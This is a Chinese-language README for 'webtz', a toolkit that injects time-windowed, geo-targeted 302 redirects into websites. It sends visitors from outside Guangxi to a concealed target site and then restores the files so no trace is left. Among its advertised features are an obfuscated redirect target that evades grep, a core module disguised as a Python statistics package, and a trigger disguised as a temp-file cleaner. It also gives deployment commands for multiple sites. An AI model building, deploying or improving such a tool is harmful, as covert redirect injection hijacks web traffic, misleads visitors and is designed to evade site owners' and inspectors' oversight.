# webtz — 分省分时 302 跳转系统

> 品牌/入口域名在指定时间窗口内，把指定省份之外的访客 302 到目标站；省内访客与窗口外完全不受影响，窗口结束自动把所有入口文件还原为基线（无痕）。纯 PHP + shell + systemd 实现，无第三方依赖（不需要 geoip 扩展 / mmdb / composer）。

## 特性

- **省份判定**：纯 PHP 最长前缀匹配 CIDR 表（零依赖，单次判定 ~0.004ms），附广西全量 CIDR 2857 段（ip2region 聚合）
- **分时执行**：任意多个 `[起,止)` 时间窗（支持跨零点，分钟精度），由 systemd timer 每分钟节拍自动开/关
- **自动还原**：窗口结束强制覆盖回基线（字节级 sha256 校验，保真尾部换行），业务侧无感知
- **目标隐藏**：跳转目标 URL 以 xor+base64 存储在数据文件中，源码与全盘 grep 均无明文
- **无痕运行**：判定核心伪装为 Python 包内统计模块；触发器伪装为临时文件清理工具（真干活）；systemd timer / crontab / 文件名均无业务关键词
- **多源兜底**：X-Real-IP → CF-Connecting-IP → XFF → REMOTE_ADDR，天然兼容 CDN；取不到 IP 默认不跳（保守）
- **灰度与豁免**：按 IP 哈希分桶的百分比灰度；运维 IP 白名单；手工必不跳网段名单（最高优先级）

## 目录结构

```
webtz/
├── scripts/
│   ├── deploy.sh          # 一键部署（传站点清单文件即可）
│   ├── uninstall.sh       # 干净卸载
│   ├── memstat.php        # 判定核心（跳转/不跳的全部逻辑）
│   ├── cgroup-sync        # 开关执行器（注入/还原，字节级）
│   ├── cgroup-stat.sh     # 每分钟节拍（窗口决策，timer 调用）
│   └── tmpclean.tmpl      # 伪装的双功能工具模板（部署时生成 /usr/sbin/tmpclean）
├── etc/
│   ├── guangxi_cidr.txt   # 广西 CIDR 表（2857 段）
│   ├── gx_manual.txt.example  # 手工必不跳名单示例
│   └── kstat.bin.example      # 目标域名密文示例（部署时重新生成）
├── tools/
│   └── gen_target.py      # 生成目标域名密文
├── docs/
│   ├── ARCHITECTURE.md    # 架构与实现原理（分地区/分时如何实现）
│   ├── DEPLOY.md          # 部署手册（步骤/验证/排坑）
│   └── OPS.md             # 运维手册（日常操作/参数调整/日志）
├── data/                  # 运行时数据（部署后生成：基线/映射表/日志）
└── README.md
```

## 快速开始

```bash
# 1) 写站点清单（每行：站点名 TAB或空格 站点根目录）
cat > /root/sites.txt <<EOF
z678538  /www/wwwroot/ff/z678538
z679928  /www/wwwroot/ff/z679928
EOF

# 2) 一键部署（交互输入跳转目标 URL 与时间窗口）
sudo bash scripts/deploy.sh /root/sites.txt

# 3) 验证
curl -H 'Host: <域名>' -H 'X-Real-IP: 8.8.8.8'      http://127.0.0.1/   # 省外 → 302 目标站
curl -H 'Host: <域名>' -H 'X-Real-IP: 111.55.170.4' http://127.0.0.1/   # 广西 → 原链路
```

详细步骤、参数、排坑见 [docs/DEPLOY.md](docs/DEPLOY.md)；实现原理见 [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)。

## 时间窗口示例

```
02:00-10:00          # 凌晨到上午
18:30-18:45          # 傍晚 15 分钟
22:00-06:00          # 跨零点
```

## 兼容性

- Web：宝塔 nginx（含 `.user.ini` open_basedir 白名单自动处理、chattr ±i）
- PHP：7.4 / 8.x（fpm 用户需可读模块目录，脚本自动处理）
- 系统：Linux + systemd（Debian/Ubuntu/CentOS 均可）

## License

Private / internal use.
